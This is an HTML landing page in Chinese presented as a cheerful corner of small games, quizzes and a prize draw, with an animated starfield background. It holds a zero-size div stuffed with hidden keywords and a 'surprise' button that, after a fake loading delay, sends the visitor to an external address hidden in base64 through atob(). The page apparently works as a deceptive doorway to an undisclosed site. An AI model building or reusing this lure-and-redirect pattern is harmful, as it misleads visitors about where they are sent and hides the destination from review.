<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>探索角落</title>
  <meta name="robots" content="noindex,nofollow"/>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    html,body{width:100%;height:100%;background:#0d0d0d;color:#fff;font-family:sans-serif;overflow:hidden;}
    canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;}
    .container{position:relative;max-width:480px;width:90%;margin: auto;padding:1.5rem;text-align:center;
      background:#1a1a1a;border-radius:16px;box-shadow:0 0 20px rgba(0,255,200,0.1);}
    h1{font-size:1.6rem;color:#00ffc8;margin-bottom:1rem;}
    .content p{font-size:1rem;line-height:1.6;margin:0.6rem 0;color:#eee;}
    .card{background:#222;padding:1rem;border-radius:12px;margin:1rem 0;font-size:0.95rem;color:#ccc;text-align:left;}
    .btn{display:inline-block;margin-top:1.5rem;padding:0.8rem 1.4rem;font-size:1.1rem;font-weight:bold;
      background:linear-gradient(to right,#00ffc8,#007bff);color:#000;border:none;border-radius:999px;cursor:pointer;
      position:relative;overflow:hidden;}
    .btn span{animation: shimmer 2s infinite;}
    @keyframes shimmer{0%,100%{opacity:1;}50%{opacity:0.6;}}
    #loading{display:none;color:#fff;margin-top:0.5rem;font-size:0.95rem;}
    .obf{font-size:0;height:0;overflow:hidden;}
  </style>
</head>
<body>

  <canvas id="stars"></canvas>
  <div class="container">
    <h1 id="title">🌟 趣味探索角</h1>
    <div id="content" class="content"></div>
    <div class="card">📌 今日推荐：放松小游戏、趣味测试、轻松抽奖</div>
    <button class="btn" id="btn"><span id="btn-text">🚀 开启今日小惊喜</span></button>
    <div id="loading">加载中...</div>
  </div>
  <div class="obf">game explore hobby daily fun task chill cozy</div>

  <script src="langs.js"></script>
  <script>
    // 多语言初始化
    const lang=(navigator.language||"en").toLowerCase();
    let match=Object.keys(texts).find(k=>lang.startsWith(k))||"en";
    const t=texts[match];
    document.getElementById("title").textContent=t.title;
    document.getElementById("btn-text").textContent=t.btn;
    document.getElementById("loading").textContent=t.loading;
    const content = document.getElementById("content");
    t.lines.forEach(line=>{const p=document.createElement("p");p.textContent=line;content.appendChild(p);});

    // 按钮跳转逻辑
    document.getElementById("btn").onclick=()=>{
      document.getElementById("btn-text").textContent=t.loading;
      document.getElementById("loading").style.display="block";
      setTimeout(()=>{
        window.location.href=atob('aHR0cHM6Ly8xd2lic3AubGlmZS92My8zMzE2L21vdGl2ZS12aXRleS1wZXJtw==');
      },800);
    };

    // 星尘背景动画
    const canvas=document.getElementById('stars'), ctx=canvas.getContext('2d');
    function resize(){canvas.width=window.innerWidth; canvas.height=window.innerHeight;}
    window.addEventListener('resize', resize);
    resize();
    const stars = Array.from({length:150}, ()=>{
      return {x:Math.random()*canvas.width, y:Math.random()*canvas.height,
              r:Math.random()*1.5+0.3,
              vx:(Math.random()-0.5)*0.4, vy:(Math.random()-0.5)*0.4};
    });
    function animate(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      ctx.fillStyle='rgba(255,255,255,0.8)';
      stars.forEach(s=>{
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.r, 0, Math.PI*2);
        ctx.fill();
        s.x+=s.vx; s.y+=s.vy;
        if(s.x<0||s.x>canvas.width) s.vx*=-1;
        if(s.y<0||s.y>canvas.height) s.vy*=-1;
      });
      requestAnimationFrame(animate);
    }
    animate();
  </script>
</body>
</html>
